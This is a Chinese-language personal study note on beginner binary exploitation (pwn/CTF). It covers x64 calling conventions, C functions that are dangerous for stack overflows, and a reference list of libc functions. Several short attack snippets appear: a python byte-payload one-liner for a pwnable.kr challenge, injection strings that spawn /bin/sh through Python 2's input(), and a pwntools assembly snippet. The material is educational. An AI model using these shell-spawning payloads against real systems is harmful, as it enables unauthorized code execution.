<p>通用寄存器中，不必假设保存值可随意使用的寄存器有5个：是rax、rcx、rdx、rdi、rsi。其中rax用于第一个返回寄存器（当 然也可以用于其它用途），rdx用于第二个返回寄存器（在调用函数时也用于第三个参数寄存器）</p>
<p>x86和x64下的创建栈帧的过程基本一致，就不再赘述了。</p>
<p>二者简单区别在于被调函数的参数的存储位置</p>
<ul>
<li>x86<ul>
<li>存储在主调函数的栈帧中，在函数返回地址的上方</li>
</ul>
</li>
<li>x64<ul>
<li>函数的前六个整型或指针参数依次保存在RDI,RSI,RDX,RCX,R8,R9中，如果还有更多的参数的话才会保存在栈上</li>
<li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常</li>
<li>栈按照16字节对齐（就是说栈的大小是16的倍数）</li>
</ul>
</li>
</ul>
<p>来源于 CTF-wiki </p>
<p>栈溢出危险函数：</p>
<p>（1）输入</p>
<ul>
<li>gets 读取一行，忽略\x00（’\0’）</li>
<li>scanf</li>
<li>vscanf</li>
<li>read</li>
</ul>
<p>（2）输出</p>
<ul>
<li>sprintf</li>
</ul>
<p>（3）字符串函数</p>
<ul>
<li>strcat 字符串拼接，遇到\x00（’\0’）停止</li>
<li>strcpy 字符串复制，遇到\x00（’\0’）停止</li>
<li>bcopy</li>
</ul>
<hr>
<p>补充（一些我不懂的知识点）：</p>
<p>1、系统调用输入函数*<em>read(int fd, void <em>buf, size_t count)</em></em></p>
<p>size_t：表示无符号整数</p>
<p>ssize_t：表示有符号整数</p>
<p>（1）fd：将要读取数据的文件描述符；buf：所读取到的数据的内存缓冲；count：需要读取的数据量。</p>
<p>（2）fd为0时，表示为标准输入（键盘上获取输入），这时也是我们可以进行输入的时候；buf就是指一块存储空间，获取到的数据填入这里</p>
<p>（3）函数**write(int fd, void *buf, size_t count)**与之对应，是向buf缓存区写入一些数据，fd为1时表示为标准输出（显示在显示器上）</p>
<p>（4）fd=2时表示标准错误，这0，1，2是系统默认使用的，而3，4……等，可以由使用者自行决定</p>
<p>（5）成功<strong>返回读取的字节数</strong>，出错返回-1并设置errno，如果在调read之前已到达文件末尾，则这次read返回0</p>
<p>2、<strong>atoi()</strong> 功能是把字符串转换成整数（int类型的），还有个相同功能的**atol()**是把字符串转换成长整型数（long类型的）</p>
<p>3、python发送数据的固定格式为：$(python -c “print ‘\xe8\x05\xd9\x1d’ + ‘\x01’*16’ “)(这里pwnable.kr col题作为一个例子，强调这里不用\x00是因为会阻断)</p>
<p>随机数问题中的函数：rand() ，srand()，time()</p>
<p>1、<strong>rand()<strong>原型为：</strong>int rand(void)</strong> 。rand() 用来产生随机数，但是，rand()的内部实现是用线性同余法实现的，是伪随机数，由于周期较长，因此在一定范围内可以看成是随机的</p>
<p>（1）**rand()**会返回一个范围在0到RAND_MAX（32767）之间的伪随机数（整数）</p>
<p>（2）使用rand()函数产生0-99以内的随机整数：int number1 = rand() % 100; (如果要生成1-100，在后面加1即可)</p>
<p>（3）如果没有设置随机数种子，rand()函数在调用时，自动设计随机数种子为1（相当于srand(1)的情况）。随机种子相同，每次产生的随机数也会相同。</p>
<p>2、time()：是C语言获取当前系统时间的函数，以秒作单位，代表当前时间自Unix标准时间戳(1970年1月1日0点0分0秒，GMT)经过了多少秒</p>
<p>（1）一般在随机数中，使用形式为time(0),获取正在变化的时间值，来配合srand()函数进行初始化函数发生器，生成不同的随机数</p>
<p>3、**srand()<strong>原型为：</strong>void srand (usigned int seed)**。用来设置rand()产生随机数时的随机数种子</p>
<p>（1）通常可以利用time(0)或getpid(0)的返回值作为seed</p>
<p>（2）使用srand()函数可以用来给rand()函数生成不一样的随机数种子</p>
<p>（3）使用rand()和srand()产生0-99以内的真正的随机整数:  srand(time(0));     int number1 = rand() % 100;</p>
<p>注：用time(0)作为随机数种子时，两次程序运行的时间间隔要超过一秒，否则两次运行得到的随机数将一致</p>
<p>4、**memcpy()**函数原型为 **void *memcpy(void <em>destin, void <em>source, unsigned n)</em></em> 功能为：从源source中拷贝n个字节到目标destin中，不会自动加上’\0’</p>
<p>5、**memset()<strong>原型为：</strong>void <em>memset(void <em>s, int ch, size_t n)</em></em>  功能为将s中当前位置后面的n个字节用 ch 替换并返回 s </p>
<p>注：这里用ch做符号，是因为该函数只能取ch的低八位数，取值范围为0~255，跟字符的取值一样</p>
<p>6、memcmp()函数原型为**int memcmp(const void *str1, const void *str2, size_t n)**功能为比较内存区域buf1和buf2的前n个字节，str1&gt;str2,返回正数；str1=str2返回0；str1&lt;str2返回负数，比大小时，一旦能确认大小则停止比较，直接返回数值</p>
<p>7、rax eax ax ah al分别是：64位、低32位、低16位、ax的高8位、ax的低8位</p>
<p>8、**strchr()<strong>函数原型为：</strong>char *strchr(const char *str, int c)**功能为在str所指向的字符串中搜索第一次出现ASCII码值为c的字符的位置，若存在则返回该字符的地址，否则返回NULL</p>
<p>9、violatile关键字通常用来修饰多线程共享的全局变量和IO内存。告诉编译器，不要把此类变量优化到寄存器中，每次都要老老实实的从内存中读取，因为它们随时都可能变化。</p>
<p>10、函数返回值是通过寄存器进行返回的。编译器使用eax作为存储返回值的寄存器，被调函数在ret前设置eax，返回后，主调函数从eax获取到该值。</p>
<p>11、**mprotect()<strong>函数原型为</strong>int mprotect(const void *start, size_t len, int prot)**功能为mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值（可读为4，可写为2，可执行为1）一般直接取7。</p>
<p>12、<strong>xxd</strong>命令可以查看文件的十六进制值，<strong>xxd 文件名 | tail</strong>可以打印十六进制值中的末尾数据。如果文件是被加上了upx压缩壳，可以输入<strong>upx -d</strong> 文件名 进行解压</p>
<p>13、**fflush(stdin)**是清空输入缓冲区的意思</p>
<p>14、<strong>malloc</strong>函数原型为为**void *malloc(unsigned int size)**；其作用是在内存的动态存储区中分配一个长度为size的连续空间。此函数的返回值是分配区域的起始地址，或者说，此函数是一个指针型函数，返回的指针指向该分配域的开头位置。</p>
<p>分配成功则返回指向被分配内存的指针(此存储区中的初始值不确定)，否则返回空指针NULL。当动态内存不再使用时，应使用free()函数将内存块释放。</p>
<p>15、setvbuf原型 <strong>int setvbuf(FILE *stream, char *buf, int type, unsigned size)</strong> 用于设定文件流的缓冲区</p>
<p>type ： 期望缓冲区的类型：</p>
<p>_IOFBF(满缓冲）：当缓冲区为空时，从流读入数据。或者当缓冲区满时，向流写入数 据。</p>
<p>_IOLBF(行缓冲）：每次从流中读入一行数据或向流中写入一行数据。</p>
<p>_IONBF(无缓冲）：直接从流中读入数据或直接向流中写入数据，而没有缓冲区。</p>
<p>size ： 缓冲区内字节的数量。</p>
<p>成功执行返回0,否则返回非零值</p>
<p>16、**/dev/random<strong>和</strong>/dev/urandomLinux**是系统中提供的随机伪设备。这两个设备的任务，是提供永不为空的随机字节数据流 </p>
<p>用法：用open函数打开，然后从文件描述符中获取数据即可。</p>
<p>17、strcspn函数原型：**size_t strcspn(const char *s, const char * reject) **</p>
<p>功能：strcspn()从参数s 字符串的开头计算连续的字符，而这些字符都完全不在参数reject 所指的字符串中。简单地说， 若strcspn()返回的数值为n，则代表字符串s 开头连续有n 个字符都不含字符串reject 内的字符。</p>
<p>返回值为返回字符串s 开头连续不含字符串reject 内的字符数目。</p>
<p>18、回车 代码：CR ASCII码：/ r ，十六进制，0x0d，回车的作用只是移动光标至该行的起始位置；</p>
<p>换行 代码：LF ASCII码：/ n ，十六进制，0x0a，换行至下一行行首起始位置；</p>
<p>19、snprintf 函数原型**int snprintf(char <em>str, size_t size, const char <em>format, …)</em></em></p>
<p>功能：将可变个参数(…)按照format格式化成字符串，然后将其复制到str中。</p>
<p>(1) 如果格式化后的字符串长度 &lt; size，则将此字符串全部复制到str中，并给其后添加一个字符串结束符(‘\0’)；</p>
<p>(2) 如果格式化后的字符串长度 &gt;= size，则只将其中的(size-1)个字符复制到str中，并给其后添加一个字符串结束符(‘\0’)，返回值为欲写入的字符串长度。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> a[<span class="hljs-number">16</span>];<br>  <span class="hljs-keyword">size_t</span> i;<br> <br>  i = <span class="hljs-built_in">snprintf</span>(a, <span class="hljs-number">13</span>, <span class="hljs-string">&quot;%012d&quot;</span>, <span class="hljs-number">12345</span>);  <span class="hljs-comment">// 第 1 种情况</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i = %lu, a = %s\n&quot;</span>, i, a);    <span class="hljs-comment">// 输出：i = 12, a = 000000012345</span><br> <br>  i = <span class="hljs-built_in">snprintf</span>(a, <span class="hljs-number">9</span>, <span class="hljs-string">&quot;%012d&quot;</span>, <span class="hljs-number">12345</span>);   <span class="hljs-comment">// 第 2 种情况</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i = %lu, a = %s\n&quot;</span>, i, a);    <span class="hljs-comment">// 输出：i = 12, a = 00000001</span><br> <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>20、<strong>int execve(const char * filename,char * const argv[ ],char * const envp[ ])</strong></p>
<p>execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组。</p>
<p>21、**getchar()**的返回值为输入字符的ASCII码值。又因为在字符串在内存里面都是以ASCII码值存储的，我们输入的payload都是字符串，换言之，进行循环的getchar就是另类的read</p>
<p>22、**extern char <em>strdup(char <em>s)</em></em></p>
<p>strdup()可以将字符串拷贝到新建的位置处，strdup()在内部调用了malloc()为变量分配内存，不需要使用返回的字符串时，需要用free()释放相应的内存空间，否则会造成内存泄漏。返回一个指针,指向为复制字符串分配的空间，如果分配空间失败,则返回NULL值</p>
<p>23、<strong>size_t getpagesize(void)</strong></p>
<p>函数功能为：返回一分页的大小，单位为字节(byte)。此为系统的分页大小，不一定会和硬件分页大小相同。</p>
<p>返回值：内存分页大小。</p>
<p>24、**extern void <em>memchr(const void <em>buf, int ch, size_t count)</em></em></p>
<p>功能：从buf所指内存区域的前count个字节查找字符ch。</p>
<p>说明：当第一次遇到字符ch时停止查找。如果成功，返回指向字符ch的指针；否则返回NULL。</p>
<p>25、<strong>FILE *fopen(const char *filename, const char *mode)</strong></p>
<ul>
<li><strong>filename</strong>– 这是 C 字符串，包含了要打开的文件名称。</li>
<li><strong>mode</strong>– 这是 C 字符串，包含了文件访问模式。</li>
</ul>
<p>功能：使用给定的模式<strong>mode</strong>打开<strong>filename</strong>所指向的文件；文件顺利打开后，指向该流的文件指针就会被返回。如果文件打开失败则返回 NULL，并把错误代码存在error中</p>
<p>26、<strong>size_t fread( void *buffer, size_t size, size_t count, FILE *stream )</strong></p>
<ul>
<li><strong>buffer–指向要输入的数组中首个对象的指针</strong></li>
<li><strong>size– 每个对象的大小（单位是字节）</strong></li>
<li><strong>count– 要读取的对象个数</strong></li>
<li><strong>stream– 输入流</strong></li>
</ul>
<p>功能：从给定输入流stream读取最多count个对象到数组buffer中（相当于对每个对象调用size次fgetc)，把buffer当作unsigned char数组并顺序保存结果。流的文件位置指示器前进读取的字节数。</p>
<p>27、**char <em>strtok(char s[], const char <em>delim)</em></em></p>
<p>功能：分解字符串为一组字符串。s为要分解的字符串，delim为分隔符字符（如果传入字符串，则传入的字符串中每个字符均为分割符）。首次调用时，s指向要分解的字符串，之后再次调用要把s设成NULL</p>
<p>返回值：从s开头开始的一个个被分割的串。当s中的字符查找到末尾时，返回NULL；如果查找不到delim中的字符时，返回当前strtok的字符串的指针。</p>
<p>28、*<em>long int strtol(const char <em>nptr,char **endptr,int base)</em></em></p>
<p>功能：strtol函数会将参数nptr字符串根据参数base来转换成长整型数，参数base范围从2至36</p>
<p>参数base代表采用的进制方式，如base值为10则采用10进制，若base值为16则采用16进制等。当base值为0时则是采用10进制做转换，但遇到如’0x’前置字符则会使用16进制做转换、遇到’0’前置字符而不是’0x’的时候会使用8进制做转换。</p>
<p>29、python2中的input()函数存在漏洞，会执行获得的输入，所以如果脚本存在引入os库输入<code>os.system(&#39;/bin/sh&#39;)</code>即可getshell，如没有引入os库，输入该内容<code>__import__(&#39;os&#39;).system(&#39;/bin/sh&#39;)</code> 也可getshell</p>
<p>30、</p>
<p><img src="/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/image-20211007195137781.png"><span class="image-caption">image-20211007195137781</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> binascii<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-built_in">print</span>(binascii.b2a_hex(asm(<span class="hljs-string">&#x27;jmp $+0x9e&#x27;</span>)))<br></code></pre></td></tr></table></figure>

<p>可用该方法得到汇编的机器码</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
